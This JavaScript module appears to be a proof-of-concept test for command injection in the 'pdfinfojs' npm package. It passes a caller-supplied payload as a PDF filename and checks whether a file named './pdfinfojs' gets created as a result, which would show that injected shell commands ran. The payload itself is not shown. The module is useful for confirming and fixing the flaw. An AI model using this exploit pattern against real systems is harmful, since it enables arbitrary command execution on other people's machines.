const pdfinfo = require("pdfinfojs");

function exploitFunction(payload) {
  const fs = require("fs");
  const path = "./pdfinfojs";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }

  const file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  const pdf = new pdfinfo(payload);
  pdf.getInfo(function (err, info, params) {
    const file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      if (err) console.error(err);
    });
  });
}

module.exports = { exploitFunction };